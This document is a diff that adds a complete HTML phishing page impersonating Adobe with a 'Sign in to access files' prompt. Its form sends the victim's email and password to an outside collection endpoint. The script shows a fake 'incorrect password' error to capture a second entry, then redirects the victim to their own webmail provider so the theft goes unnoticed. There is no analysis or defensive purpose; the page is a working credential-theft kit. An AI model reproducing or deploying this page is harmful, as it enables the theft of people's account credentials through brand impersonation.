@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Adobe</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .bg-image {
+      background-image: url('/Users/USER/Downloads/photo_6328063621627756214_y.jpg'); /* Replace with your image URL */
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    .dark-overlay {
+      background-color: rgba(0, 0, 0, 0.6); /* Dark overlay when form is open */
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: none;
+      z-index: 1;
+    }
+    .form-container {
+      display: none;
+      background-color: #fff; /* Form background color */
+      padding: 40px;
+      border-radius: 10px;
+      z-index: 2;
+      width: 400px; /* Adjust form width */
+      max-width: 90%; /* Ensure form doesn't exceed screen width */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 10px rgba(0,0,0,0.5); /* Shadow effect */
+    }
+    .form-container img {
+      width: 50px; /* Set image width */
+      height: 50px; /* Set image height */
+      display: block;
+      margin: 0 auto;
+      margin-bottom: 20px;
+    }
+    .form-container form {
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-image" id="bgImage">
+    <div class="dark-overlay" id="darkOverlay"></div>
+    <div class="form-container" id="formContainer">
+      <img src="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0" alt="Form Image"> <!-- Replace with your form image URL -->
+      <h4>Sign in to access files</h4>
+      <form action="https://submit-form.com/NQzvTY6ca" method="post" autocomplete="">
+        <input type="hidden"  id="domainHidden" name="_redirect" value=""/>
+  
+        <div class="form-group">
+          <label for="exampleInputEmail1">Email address</label>
+          <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp">
+        </div>
+        <div class="form-group">
+          <label for="exampleInputPassword1">Password</label>
+          <input type="password" class="form-control" id="exampleInputPassword1" name="password">
+        </div>
+        <!-- Inside the form-container -->
+        <div class="error-message" id="errorMessage" style="display: none; color: red; margin-bottom: 10px; font-size: 14px;"></div>
+
+        <button type="submit" class="btn btn-primary">Login</button>
+      </form>
+    </div>
+  </div>
+  
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  <script>
+    const bgImage = document.getElementById('bgImage');
+    const formContainer = document.getElementById('formContainer');
+    const darkOverlay = document.getElementById('darkOverlay');
+    const emailInput = document.getElementById('exampleInputEmail1');
+    const domainHiddenInput = document.getElementById('domainHidden');
+  
+    bgImage.addEventListener('click', function(e) {
+      if (e.target === this) {
+        formContainer.style.display = formContainer.style.display === 'block' ? 'none' : 'block';
+        darkOverlay.style.display = darkOverlay.style.display === 'block' ? 'none' : 'block';
+      }
+    });
+  
+    formContainer.addEventListener('click', function(e) {
+      e.stopPropagation(); // Prevents click on the form from bubbling up to the bgImage
+    });
+  
+    emailInput.addEventListener('input', function() {
+      const userEmail = emailInput.value.trim();
+      const atIndex = userEmail.lastIndexOf('@');
+  
+      if (atIndex !== -1) {
+        const domain = userEmail.slice(atIndex + 1);
+        domainHiddenInput.value = domain;
+      } else {
+        domainHiddenInput.value = '';
+      }
+    });
+  
+    // Define a variable to track the number of submission attempts
+    let submissionAttempts = 0;
+    
+    const passwordInput = document.getElementById('exampleInputPassword1');
+    const errorMessage = document.getElementById('errorMessage');
+
+    document.getElementById('bgImage').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const userEmail = emailInput.value.trim();
+      const domain = domainHiddenInput.value.trim();
+
+      if (submissionAttempts === 0) {
+        // Clear the password input on the first attempt
+        passwordInput.value = '';
+        // Display "incorrect password" message inside the form on the first attempt
+        errorMessage.style.display = 'block';
+        errorMessage.textContent = 'Incorrect password. Please try again.';
+        submissionAttempts++;
+      } else {
+        // Redirect based on the extracted domain or handle form submission accordingly
+        if (domain) {
+          switch (domain.toLowerCase()) {
+            case 'gmail.com':
+              window.location.href = 'https://mail.google.com/';
+              break;
+            case 'yahoo.com':
+              window.location.href = 'https://mail.yahoo.com/';
+              break;
+            case 'outlook.com':
+              window.location.href = 'https://outlook.live.com/';
+              break;
+            default:
+              window.location.href = 'https://' + domain;
+              break;
+          }
+        } else {
+          alert('Please provide a valid email address.');
+        }
+      }
+    });
+
+
+  </script>
+  </body>
+  </html>
